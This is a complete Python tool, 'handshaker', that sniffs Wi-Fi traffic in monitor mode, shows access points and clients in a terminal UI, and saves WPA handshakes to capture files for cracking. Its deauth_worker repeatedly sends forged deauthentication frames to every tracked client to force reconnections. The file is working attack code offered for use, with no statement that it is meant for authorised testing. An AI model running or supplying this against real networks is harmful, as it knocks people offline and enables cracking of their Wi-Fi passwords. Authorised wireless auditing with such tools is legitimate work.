#!/usr/bin/env python3

"""
handshaker — WPA Handshake Sniffer and Deauth Tool

- Displays APs and clients in a live ncurses UI.
- Captures WPA handshakes and saves to .cap files if output directory is set.
- Can filter by SSID/BSSID and do deauth for handshake capture.
- Shows persistent EAPOL capture notifications in the top bar if filtered.
"""

import argparse
import os
import threading
import time
import subprocess
from datetime import datetime

from scapy.all import *
import urwid

# =========== Globals & State ===========
networks = {}          # BSSID -> {ssid, channel, clients: {mac: last_seen}}
logs = []              # Scrollable log
log_lock = threading.Lock()
cap_files = {}         # output_file -> PcapWriter
stop_threads = False
recent_eapol = {}      # (bssid, client) -> [timestamp, ...]

# For persistent header notifications
persistent_eapol_captures = set()  # set of (ssid, bssid) that got EAPOL

def parse_args():
    parser = argparse.ArgumentParser(
        description='Capture WPA handshakes and manage Wi-Fi clients (with optional deauth).'
    )
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface in monitor mode')
    parser.add_argument('-c', '--channel', type=int, help='Channel to scan')
    parser.add_argument('-s', '--target-ssid', help='Filter by SSID')
    parser.add_argument('-b', '--target-bssid', help='Filter by BSSID')
    parser.add_argument('-t', '--timeout', type=int, default=60, help='Client timeout (seconds)')
    parser.add_argument('-d', '--deauth', action='store_true', help='Enable deauthentication')
    parser.add_argument('--interval', type=int, default=10, help='Deauth burst interval (seconds)')
    parser.add_argument('--output-directory', help='Directory for .cap files (no output if not set)')
    return parser.parse_args()

# ========== Utility Functions ==========

def is_unicast(mac):
    """Check if a MAC address is unicast."""
    try:
        if not mac or len(mac.split(':')) != 6:
            return False
        first_octet = int(mac.split(':')[0], 16)
        return (first_octet & 1) == 0
    except Exception:
        return False

def log(msg):
    """Append a timestamped log message."""
    with log_lock:
        ts = datetime.now().strftime('%H:%M:%S')
        logs.append(f'[{ts}] {msg}')
        if len(logs) > 500:
            logs.pop(0)

def channel_hopper(interface, user_channel=None):
    """Hop channels, or set fixed channel if user specified."""
    chs = [1,2,3,4,5,6,7,8,9,10,11]
    i = 0
    while not stop_threads:
        if user_channel:
            ch = user_channel
        else:
            ch = chs[i % len(chs)]
            i += 1
        try:
            subprocess.run(['iwconfig', interface, 'channel', str(ch)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log(f'Switched to channel {ch}')
        except Exception as e:
            log(f'Error changing channel: {e}')
        time.sleep(2 if not user_channel else 5)
        if user_channel:
            break

def get_capfile(ssid, output_dir):
    """Get or create a PcapWriter for a given SSID in the output directory."""
    if not output_dir:
        return None
    safe_ssid = ssid if ssid else 'unknown'
    fn = os.path.join(output_dir, f'{safe_ssid}_capture.cap')
    if fn not in cap_files:
        cap_files[fn] = PcapWriter(fn, append=True, sync=True)
    return cap_files[fn]

def cleanup_capfiles():
    """Close all open PcapWriters."""
    for pcap in cap_files.values():
        try:
            pcap.close()
        except:
            pass

# ========== Packet Processing ==========

def process_packet(pkt, args, ui=None):
    """Process a sniffed 802.11 packet."""
    # ---- AP Detection ----
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr2
        ssid = '<hidden>'
        if pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
        # Extract channel
        channel = None
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if elt.ID == 3 and elt.info:
                channel = elt.info[0]
                break
            elt = elt.payload.getlayer(Dot11Elt)
        # Filtering
        if args.target_ssid and ssid != args.target_ssid:
            return
        if args.target_bssid and bssid.lower() != args.target_bssid.lower():
            return
        if bssid not in networks:
            log(f'AP discovered: {ssid} ({bssid}) ch {channel}')
            networks[bssid] = {'ssid': ssid, 'channel': channel, 'clients': {}}
        else:
            networks[bssid]['ssid'] = ssid
            networks[bssid]['channel'] = channel

    # ---- Client Detection (Data/Auth) ----
    if pkt.haslayer(Dot11):
        toDS = pkt[Dot11].FCfield & 0x1
        fromDS = pkt[Dot11].FCfield & 0x2
        addr1, addr2 = pkt[Dot11].addr1, pkt[Dot11].addr2
        bssid = client = None
        if fromDS and not toDS:
            bssid = addr2; client = addr1
        elif toDS and not fromDS:
            bssid = addr1; client = addr2
        else:
            return
        if not bssid or not client or not is_unicast(client):
            return
        # Only track clients if AP is already known when filtering
        if (args.target_ssid or args.target_bssid) and bssid not in networks:
            return
        if args.target_bssid and bssid.lower() != args.target_bssid.lower():
            return
        if bssid not in networks:
            networks[bssid] = {'ssid': '', 'channel': None, 'clients': {}}
        if client not in networks[bssid]['clients']:
            log(f'Client {client} seen on {bssid}')
        networks[bssid]['clients'][client] = time.time()

    # ---- WPA Handshake Detection ----
    if pkt.haslayer(EAPOL):
        bssid = client = None
        if pkt[Dot11].addr2 in networks:
            bssid = pkt[Dot11].addr2
            client = pkt[Dot11].addr1
        elif pkt[Dot11].addr1 in networks:
            bssid = pkt[Dot11].addr1
            client = pkt[Dot11].addr2
        ssid = networks.get(bssid, {}).get('ssid', 'unknown')
        log(f'Handshake/EAPOL captured for SSID {ssid} ({bssid})')

        # Mark EAPOL as "crackable" if at least 2 seen in 10 seconds
        if bssid and client and (args.target_ssid or args.target_bssid):
            now = time.time()
            key = (bssid, client)
            if key not in recent_eapol:
                recent_eapol[key] = []
            recent_eapol[key] = [t for t in recent_eapol[key] if now - t < 10]
            recent_eapol[key].append(now)
            if len(recent_eapol[key]) >= 2:
                # Only add new notification if not already present for this ssid/bssid
                capture_key = (ssid, bssid)
                if capture_key not in persistent_eapol_captures:
                    persistent_eapol_captures.add(capture_key)
                    if ui:
                        ui.update_eapol_notification()
                recent_eapol[key] = []

        # Write to capture file if set
        if args.output_directory:
            capfile = get_capfile(ssid, args.output_directory)
            if capfile:
                capfile.write(pkt)

    # ---- Save all packets for filtered networks ----
    if pkt.haslayer(Dot11):
        bssid = pkt[Dot11].addr2 if pkt[Dot11].addr2 in networks else pkt[Dot11].addr1
        ssid = networks.get(bssid, {}).get('ssid', None)
        if args.output_directory and ssid:
            capfile = get_capfile(ssid, args.output_directory)
            if capfile:
                capfile.write(pkt)

# ========== Worker Threads ==========

def deauth_worker(args):
    """Periodically send deauth packets to all tracked clients."""
    while not stop_threads:
        for bssid, ap in networks.items():
            for client in list(ap['clients']):
                if not is_unicast(client):
                    continue
                pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(pkt, iface=args.interface, count=5, inter=0.1, verbose=0)
                log(f'Deauth sent to {client} on {bssid}')
        time.sleep(args.interval)

def timeout_worker(timeout):
    """Remove clients that haven't been seen in timeout seconds."""
    while not stop_threads:
        now = time.time()
        for bssid, ap in networks.items():
            to_remove = [c for c, ts in ap['clients'].items() if now - ts > timeout]
            for c in to_remove:
                log(f'Removing inactive client {c} from {bssid}')
                del ap['clients'][c]
        time.sleep(5)

def sniffer_worker(args, ui):
    """Sniff packets, send to process_packet()."""
    sniff(iface=args.interface,
          prn=lambda p: process_packet(p, args, ui),
          store=0, stop_filter=lambda x: stop_threads)

# ========== UI Class ==========

class HandshakerUI:
    """Ncurses-like UI for handshaker."""
    def __init__(self, args):
        self.args = args
        self.ap_list_walker = urwid.SimpleListWalker([])
        self.log_walker = urwid.SimpleListWalker([])
        self.ap_listbox = urwid.ListBox(self.ap_list_walker)
        self.log_listbox = urwid.ListBox(self.log_walker)
        self.header_widget = urwid.Text(self.make_header())
        self.layout = urwid.Frame(
            header=self.header_widget,
            body=urwid.Pile([
                ('weight', 3, self.ap_listbox),
                ('weight', 1, self.log_listbox)
            ])
        )
        self.loop = urwid.MainLoop(self.layout, unhandled_input=self.unhandled_input)

    def make_header(self):
        """Build top bar, tacking EAPOL captures at end if any."""
        base = "Handshaker: WPA Handshake Sniffer/Deauth Tool — q to quit"
        if persistent_eapol_captures:
            parts = [f"[ WPA EAPOL Captured {ssid} {bssid} ]"
                     for ssid, bssid in sorted(persistent_eapol_captures)]
            return f"{base}   " + " ".join(parts)
        return base

    def update_eapol_notification(self):
        """Force header redraw."""
        self.header_widget.set_text(self.make_header())

    def unhandled_input(self, k):
        """Exit on q/Q."""
        if k in ('q', 'Q'):
            global stop_threads
            stop_threads = True
            raise urwid.ExitMainLoop()

    def update(self, *_):
        """Periodic update of UI elements."""
        # Update AP/client list
        items = []
        for bssid, ap in networks.items():
            ssid = ap.get('ssid', '<unknown>')
            ch = ap.get('channel', '?')
            header = urwid.Text([('bold', f'{ssid:20}  {bssid:17}  ch{ch}')])
            clients = ap.get('clients', {})
            client_texts = [urwid.Text(f'    ↳ {c}') for c in clients]
            items.append(header)
            items.extend(client_texts)
        self.ap_list_walker[:] = items

        # Update logs, auto-scroll if at end
        with log_lock:
            new_logs = [urwid.Text(l) for l in logs[-50:]]
        log_box = self.log_listbox
        log_focus_at_end = False
        if len(self.log_walker):
            if log_box.focus_position == len(self.log_walker) - 1:
                log_focus_at_end = True
        self.log_walker[:] = new_logs
        if len(self.log_walker) > 0 and log_focus_at_end:
            log_box.focus_position = len(self.log_walker) - 1

        # Update header if needed
        self.header_widget.set_text(self.make_header())
        self.loop.set_alarm_in(1, self.update)

    def run(self):
        """Run the urwid main loop."""
        self.loop.set_alarm_in(0, self.update)
        self.loop.run()

# ========== Main Entry Point ==========

def main():
    args = parse_args()
    if args.output_directory:
        os.makedirs(args.output_directory, exist_ok=True)
    log(f'Handshaker started on {args.interface}')
    if args.channel:
        log(f'Scanning on channel {args.channel}')
    else:
        log('Channel hopping enabled')

    ui = HandshakerUI(args)

    # Launch worker threads
    threads = []
    t_ch = threading.Thread(target=channel_hopper, args=(args.interface, args.channel), daemon=True)
    t_ch.start(); threads.append(t_ch)
    t_to = threading.Thread(target=timeout_worker, args=(args.timeout,), daemon=True)
    t_to.start(); threads.append(t_to)
    t_sniff = threading.Thread(target=sniffer_worker, args=(args, ui), daemon=True)
    t_sniff.start(); threads.append(t_sniff)
    if args.deauth:
        t_deauth = threading.Thread(target=deauth_worker, args=(args,), daemon=True)
        t_deauth.start(); threads.append(t_deauth)

    try:
        ui.run()
    except KeyboardInterrupt:
        pass
    finally:
        global stop_threads
        stop_threads = True
        cleanup_capfiles()
        log('Exiting...')

if __name__ == '__main__':
    main()

